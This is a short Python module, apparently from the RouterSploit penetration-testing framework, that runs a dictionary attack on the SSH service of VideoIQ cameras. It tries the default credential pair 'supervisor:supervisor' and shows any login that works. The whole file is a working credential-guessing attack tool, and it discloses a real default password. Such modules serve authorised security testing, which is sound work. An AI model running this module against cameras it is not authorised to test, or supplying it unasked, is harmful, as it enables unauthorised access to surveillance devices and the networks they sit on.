from routersploit.core.exploit import *
from routersploit.modules.creds.generic.ssh_default import Exploit as SSHDefault


class Exploit(SSHDefault):
    __info__ = {
        "name": "VideoIQ Camera Default SSH Creds",
        "description": "Module performs dictionary attack against VideoIQ Camera SSH service."
                       "If valid credentials are found, they are displayed to the user.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "devices": (
            "VideoIQ Camera",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(22, "Target SSH port")

    threads = OptInteger(1, "Number of threads")
    defaults = OptWordlist("supervisor:supervisor", "User:Pass or file with default credentials (file://)")
